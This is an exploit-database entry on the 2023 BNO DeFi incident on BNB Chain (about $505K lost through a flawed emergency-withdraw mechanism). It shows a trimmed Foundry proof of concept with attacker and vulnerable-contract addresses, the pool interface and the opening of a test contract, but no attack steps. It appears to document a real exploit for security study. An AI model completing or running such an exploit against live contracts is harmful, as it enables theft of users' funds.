# [?] BNO - Invalid emergency withdraw mechanism

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BNO
Published: 2023-07-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/BNO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$505K
References:
- https://twitter.com/BeosinAlert/status/1681116206663876610

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$505K
// Attacker : https://bscscan.com/address/0xa6566574edc60d7b2adbacedb71d5142cf2677fb
// Attacker Contract : https://bscscan.com/address/0xd138b9a58d3e5f4be1cd5ec90b66310e241c13cd
// Vulnerable Contract : https://bscscan.com/address/0xdca503449899d5649d32175a255a8835a03e4006
// Attack Tx : https://bscscan.com/tx/0x33fed54de490797b99b2fc7a159e43af57e9e6bdefc2c2d052dc814cfe0096b9

// @Analysis
// https://twitter.com/BeosinAlert/status/1681116206663876610

interface IPool {
    function emergencyWithdraw() external;

    function stakeNft(
        uint256[] memory tokenIds
    ) external payable;

    function unstakeNft(
        uint256[] memory tokenIds
    ) external payable;

    function pledge(
        uint256 _stakeAmount
    ) external payable;
}

contract BNOTest is Test {
    IERC721 NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/BNO_exp.sol_
